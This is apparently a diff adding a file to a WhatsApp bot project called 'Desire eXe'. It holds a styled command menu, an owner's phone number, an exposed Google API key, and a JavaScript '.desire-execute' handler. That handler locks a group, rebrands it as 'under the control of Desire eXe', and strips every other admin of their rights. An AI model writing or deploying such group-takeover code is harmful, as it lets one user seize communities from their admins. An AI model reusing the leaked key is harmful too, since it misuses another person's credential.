@@ -1,0 +1,191 @@
+╔═════〖☬𓆩👨🏽‍💻 *𝐃𝐞𝐬𝐢𝐫𝐞 𝐞𝐗𝐞* 🥷🏼 ☬〗═══╗
+┃⚠️ *_WARNING: Unleashing pure temptation..._*
+┃
+┃ _eXecutor_ : @ *Desire eXe*
+┃
+┃• _Status_ : _*Online*_
+╚═════════════════════════════════════╝
+
+_*🤖 AI*_
+*├• .gemini-ai*
+*├• .openai*
+*├• .resetopenai
+*└• .gemini-img*
+
+*_📦 Misc_*
+*├• .sticker*
+*├• .to-voice*
+*├• .weather*
+*├• .translate*
+*├• .country*
+*├• .seo*
+*├• .words*
+*├• .mtk*
+*├• .qrcode*
+*├• .anime*
+*├• .ocr*
+*├• .ssweb*
+*├• .ssmobile*
+*└• .github*
+
+_*🔒 Encrypts*_
+*├• .aes-enc*
+*├• .aes-dec*
+*├• .camellia-enc*
+*├• .camellia-dec*
+*├• .sha*
+*├• .md5*
+*├• .ripemd*
+*└• .bcrypt*
+
+*_⬇️ Downloader_*
+*├• .yt-mp4*
+*├• .yt-mp3*
+*├• .fbdl-mp4*
+*├• .fbdl-mp3*
+*├• .twdl-mp4*
+*├• .twdl-mp3*
+*├• .igdl-mp4*
+*├• .igdl-mp3*
+*├• .tkdl-mp4*
+*├• .tkdl-mp3*
+*├• .vmdl-mp4*
+*└• .vmdl-mp3*
+
+*_🌐 Wikipedia_*
+*├• .wiki-ai*
+*├• .wiki-search*
+*└• .wiki-img*
+
+*_📰 Detik_*
+*├• .detik-search*
+*├• .detik-viral*
+*└• .detik-news*
+
+_*📁 File*_
+*├• .pdf*
+*├• .doc*
+*├• .docx*
+*├• .xls*
+*├• .xlsx*
+*├• .ppt*
+*├• .pptx*
+*├• .txt*
+*├• .html*
+*├• .htm*
+*├• .csv*
+*├• .rtf*
+*├• .odt*
+*├• .ods*
+*├• .odp*
+*├• .epub*
+*├• .zip*
+*└• .gz*
+
+*_👥 Group / Owner_*
+*├• .add*
+*├• .kick*
+*├• .promote*
+*├• .demote*
+*├• .mute*
+*├• .unmute*
+*├• .ginfo*
+*├• .eXe*
+*├• .tagall*
+*├• .admins*
+*├• .warn*
+*├• .inv*
+*├• .nuke*
+*├• .Desire-eXecute*
+*├• .hidetag*
+*├• .g-name*
+*├• .g-desc*
+*├• .antilink-on*
+*├• .antilink-off*
+*├• .badwords-on*
+*├• .badwords-off*
+*├• .self-off*
+*└• .self-on*
+
+*_✨ Fun_*
+*├• .detect-h*
+*├• .flirt*
+*├• .roast*
+*├• .kill*
+*├• .t-or-d*
+*├• .flirt*
+*├• .yoMama*
+*├• .darkjokes*
+*├• .interact*
+*├• .fact*
+*└• .rate*
+
+
+
+     ~*_If You Want More Hidden Commands Messgae My eXecutor @+2347017747337.  🥷👨🏽‍💻_*~
+
+AIzaSyBu-o5weGLjR8-Lozzj2ou75MAgx_z_6OA
+Gemini ai
+
+
+
+
+
+
+
+
+
+
+if (messageBody === '.desire-execute') {
+    const groupJid = msg.key.remoteJid;
+    const ownerJid = '2347017747337@s.whatsapp.net';
+
+    // Ensure command is only used in groups and by the owner
+    const isGroup = groupJid.endsWith('@g.us');
+    const sender = isGroup ? msg.key.participant : msg.key.remoteJid;
+
+    if (!isGroup) {
+        await sock.sendMessage(groupJid, { text: 'This command can only be used in groups.' }, { quoted: msg });
+        return;
+    }
+
+    if (sender !== ownerJid && !msg.key.fromMe) {
+        await sock.sendMessage(groupJid, { text: 'You are not authorized to use this command.' }, { quoted: msg });
+        return;
+    }
+
+    try {
+        // 1. Lock the group (only admins can send messages)
+        await sock.groupSettingUpdate(groupJid, 'announcement');
+
+        // 2. Change group subject (name)
+        await sock.groupUpdateSubject(groupJid, 'Desire Reigns Supreme');
+
+        // 3. Change group description
+        await sock.groupUpdateDescription(groupJid, 'This group is now under the control of Desire eXe.');
+
+        // 4. Change group profile picture using the ss.jpg image
+        const fs = require('fs');
+        const imageBuffer = fs.readFileSync('./ss.jpg'); // Using the ss.jpg image
+        await sock.updateProfilePicture(groupJid, imageBuffer);
+
+        // 5. Dismiss all admins except the owner and the sender
+        const participants = await sock.groupMetadata(groupJid);
+        const admins = participants.participants.filter((participant) => participant.isAdmin);
+
+        for (let admin of admins) {
+            // Keep the owner and you as admins
+            if (admin.id !== ownerJid && admin.id !== sender) {
+                await sock.updateGroupAdmins(groupJid, [admin.id], 'remove');
+                console.log(`Removed admin: ${admin.id}`);
+            }
+        }
+
+        // 6. Confirmation message
+        await sock.sendMessage(groupJid, { text: 'Group lockdown and rebranding complete. Welcome to *Desire Mode*.' });
+
+    } catch (err) {
+        console.error('Error during .desire-execute:', err);
+        await sock.sendMessage(groupJid, { text: 'Failed to execute Desire command. Check logs for details.' }, { quoted: msg });
+    }
+}
